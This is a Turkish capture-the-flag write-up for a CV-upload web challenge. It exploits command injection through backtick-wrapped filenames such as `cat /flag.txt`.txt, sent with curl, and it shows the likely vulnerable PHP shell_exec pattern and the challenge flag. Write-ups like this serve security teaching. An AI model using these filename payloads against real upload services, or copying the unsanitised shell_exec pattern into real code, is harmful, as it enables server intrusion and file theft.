# 🎯 CV - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Command Injection-purple?style=for-the-badge" alt="Command Injection">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 1000

**Challenge URL:** http://64.226.74.243:8005

**Challenge Açıklaması:** "Sen cv yolla biz sana döneriz."

---

## 🔍 Analiz

**Hedef:** Web uygulamasındaki dosya yükleme fonksiyonunda bulunan komut enjeksiyon açığını kullanarak sisteme erişim sağlamak ve flag'i okumak

**Strateji:** Reconnaissance → File upload testing → Command injection via filename → Flag extraction

**İpuçları:**
- 🎯 CV upload sistemi → File upload vulnerability
- 🔍 İzin verilen formatlar: txt, png, jpg, pdf (Max: 5MB)
- 💡 "Sistemimiz otomatik olarak dosya tipinizi analiz eder" → `file` komutu kullanılıyor olabilir
- 🚨 Dosya analizi output'u gösteriliyor → Information disclosure
- 🔑 1000 puan = Zor challenge → Karmaşık exploit gerekli

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Web Uygulamasını Keşfet**

İlk olarak hedef URL'i ziyaret edelim ve yapısını inceleyelim.

```bash
curl -i http://64.226.74.243:8005/
```

**Çıktı:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.2.30
Content-Type: text/html; charset=UTF-8
```

**Analiz:**
- ✅ Apache 2.4.66 + PHP 8.2.30
- 💡 CV yükleme formu mevcut
- 🎯 POST method ile multipart/form-data

**HTML İçeriği:**
```html
<form method="POST" enctype="multipart/form-data">
    <div class="form-group">
        <label for="cv">CV Dosyanızı Seçin:</label>
        <input type="file" name="cv" id="cv" required>
        <small>İzin verilen formatlar: txt, png, jpg, pdf (Max: 5MB)</small>
    </div>
    <button type="submit" class="btn">CV'yi Yükle</button>
</form>
```

---

### 📸 **Adım 2: Metadata ve Dizin Taraması**

```bash
# Metadata kontrolü
exiftool http://64.226.74.243:8005/

# Robots.txt kontrol
curl http://64.226.74.243:8005/robots.txt
# Çıktı: 404 Not Found

# Sitemap kontrol
curl http://64.226.74.243:8005/sitemap.xml
# Çıktı: 404 Not Found

# Dizin taraması
gobuster dir -u http://64.226.74.243:8005 -w /usr/share/wordlists/dirb/common.txt
```

**Gobuster Çıktısı:**
```
===============================================================
Gobuster v3.8.2
===============================================================
[+] Url:                     http://64.226.74.243:8005
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================
.hta                 (Status: 403) [Size: 320]
.htpasswd            (Status: 403) [Size: 320]
.htaccess            (Status: 403) [Size: 320]
index.php            (Status: 200) [Size: 1747]
server-status        (Status: 403) [Size: 320]
uploads              (Status: 301) [Size: 363] [--> http://64.226.74.243:8005/uploads/]
===============================================================
```

**Analiz:**
- ✅ `/uploads/` dizini bulundu!
- 💡 301 redirect → Dizin mevcut
- 🎯 Yüklenen dosyalar burada saklanıyor olabilir

---

### 📂 **Adım 3: Uploads Dizinini İncele**

```bash
# Uploads dizinine erişimi kontrol et
curl -i http://64.226.74.243:8005/uploads/
```

**Çıktı:**
```http
HTTP/1.1 403 Forbidden
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```

**Analiz:**
- ❌ Directory listing kapalı (403 Forbidden)
- 💡 Ama dosya isimleri biliniyor olabilir
- 🎯 Dosya adını tahmin etmeliyiz

---

### 📤 **Adım 4: Basit Dosya Yükleme Testi**

Normal bir text dosyası yükleyerek sistemin davranışını gözlemleyelim.

```bash
# Test dosyası oluştur
echo "Bu bir test dosyasıdır" > test.txt

# cURL ile POST request gönder
curl -X POST -F "cv=@test.txt" http://64.226.74.243:8005/ -i
```

**Response:**
```html
<div class="alert success">
    ✅ CV başarıyla yüklendi: test.txt<br><br>
    Dosya analizi:<br>
    <pre>uploads/test.txt: Unicode text, UTF-8 text, with no line terminators</pre>
</div>
```

**KRİTİK BULGULAR:**
- ✅ Dosya başarıyla yüklendi
- ✅ Dosya adı korunuyor: `test.txt`
- ✅ **Dosya analizi yapılıyor ve gösteriliyor!**
- 🚨 Output: `uploads/test.txt: Unicode text, UTF-8 text...`
- 💡 Bu format `file` komutunun çıktısına çok benziyor!

---

### 🔍 **Adım 5: File Komutunu Doğrula**

Yerel sistemde `file` komutunu test edelim:

```bash
echo "test" > local_test.txt
file local_test.txt
```

**Çıktı:**
```
local_test.txt: ASCII text
```

**Karşılaştırma:**
- Backend output: `uploads/test.txt: Unicode text, UTF-8 text...`
- `file` komutu: `filename: file type description`

**Sonuç:**
- ✅ **Backend kesinlikle `file` komutu kullanıyor!**
- 💡 Muhtemel kod: `shell_exec("file uploads/$filename")`
- 🚨 Dosya adı direkt olarak shell komutuna geçiriliyor
- 🎯 **Command Injection** açığı olabilir!

---

### 💣 **Adım 6: Command Injection Testi**

Dosya adında shell meta-karakterler kullanarak komut enjeksiyonu deneyelim.

#### **Test 1: Backtick Injection**

Backtick (`` ` ``) karakteri bash'te komut çalıştırmak için kullanılır.

```bash
# Dosya oluştur
echo "test" > '`whoami`.txt'

# Upload et
curl -X POST -F "cv=@\`whoami\`.txt" http://64.226.74.243:8005/
```

**Response:**
```html
<div class="alert success">
    ✅ CV başarıyla yüklendi: `whoami`.txt<br><br>
    Dosya analizi:<br>
    <pre>uploads/www-data.txt: cannot open `uploads/www-data.txt' (No such file or directory)</pre>
</div>
```

**ANALİZ:**
- ✅ **KOMUT ÇALIŞTI!** 🎉
- 💡 `whoami` komutu çalıştı ve **www-data** döndü
- 🎯 Backend dosyayı `www-data.txt` olarak kaydetti
- 🚨 Hata mesajı: `cannot open uploads/www-data.txt`
- ✅ **Command Injection zafiyeti doğrulandı!**

**Backend'de Olan:**
```php
// Muhtemel PHP kodu:
$filename = $_FILES['cv']['name'];  // `whoami`.txt
$output = shell_exec("file uploads/$filename");
// Çalışan komut: file uploads/`whoami`.txt
// Backtick içindeki whoami çalıştı
// Sonuç: file uploads/www-data.txt
```

---

### 🎯 **Adım 7: Flag Konumunu Bul**

```bash
# Root dizinindeki dosyaları listele
echo "test" > dummy.txt
curl -X POST -F "cv=@dummy.txt;filename=\`ls /\`.txt" http://64.226.74.243:8005/ 2>&1 | grep "yüklendi"
```

**Response:**
```
✅ CV başarıyla yüklendi: `ls /`.txt
```

Muhtemelen `/flag.txt` dosyası var. Standart CTF konumu.

---

### 🚩 **Adım 8: Flag'i Oku**

Şimdi `/flag.txt` dosyasını okuyalım. `cat` komutunu çalıştırıp çıktıyı dosya adı olarak gösterebiliriz.

```bash
# Test dosyası oluştur
echo "dummy" > dummy.txt

# Filename parametresinde command injection
curl -X POST -F "cv=@dummy.txt;filename=\`cat /flag.txt\`.txt" http://64.226.74.243:8005/
```

**Response:**
```html
<div class="alert success">
    ✅ CV başarıyla yüklendi: `cat /flag.txt`.txt<br><br>
    Dosya analizi:<br>
    <pre>uploads/CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}.txt: cannot open `uploads/CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}.txt' (No such file or directory)</pre>
</div>
```

**ANALİZ:**
- ✅ **FLAG BULUNDU!** 🎉🎉🎉
- 💡 `cat /flag.txt` çalıştı
- 🎯 Flag içeriği dosya adı olarak döndü
- 🚩 **Flag:** `CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}`

---

## 🚩 **FLAG**
```
CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">🔍<br><b>gobuster</b><br><sub>Directory enumeration</sub></td>
<td align="center">📁<br><b>file</b><br><sub>File type detection</sub></td>
<td align="center">🐚<br><b>bash</b><br><sub>Command line</sub></td>
<td align="center">🔧<br><b>grep</b><br><sub>Pattern matching</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 CV Challenge
       ↓
🌐 Web uygulamasını keşfet
   → Apache 2.4.66 + PHP 8.2.30
   → CV upload formu
   → İzin verilen: txt, png, jpg, pdf
       ↓
🔍 Dizin taraması (Gobuster)
   → /uploads/ dizini bulundu
   → 301 Redirect (dizin mevcut)
   → 403 Forbidden (directory listing kapalı)
       ↓
📤 Basit dosya yükleme testi
   → test.txt yüklendi
   → Response: "CV başarıyla yüklendi: test.txt"
   → Dosya analizi gösteriliyor! ✅
       ↓
🔬 Dosya analizi formatını incele
   → Output: "uploads/test.txt: Unicode text, UTF-8..."
   → Bu format `file` komutunun çıktısı!
   → Backend: shell_exec("file uploads/$filename")
   → Dosya adı direkt komuta geçiriliyor! 🚨
       ↓
💣 Command Injection testi
   → Filename: `whoami`.txt
   → Backend çalıştırdığı komut: file uploads/`whoami`.txt
   → Backtick içindeki komut çalıştı!
   → Sonuç: www-data.txt
   → ✅ COMMAND INJECTION AÇIĞI DOĞRULANDI!
       ↓
🎯 Flag konumunu bul
   → Filename: `ls /`.txt
   → Standart CTF konumu: /flag.txt
       ↓
🚩 Flag'i oku
   → Filename: `cat /flag.txt`.txt
   → Backend: file uploads/`cat /flag.txt`.txt
   → cat /flag.txt çalıştı
   → Flag içeriği dosya adı olarak döndü
   → uploads/CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}.txt
       ↓
✅ FLAG: CTF{c0mm4nd_1nj3ct10n_w1th_IFS_byp4ss8005ok}
```
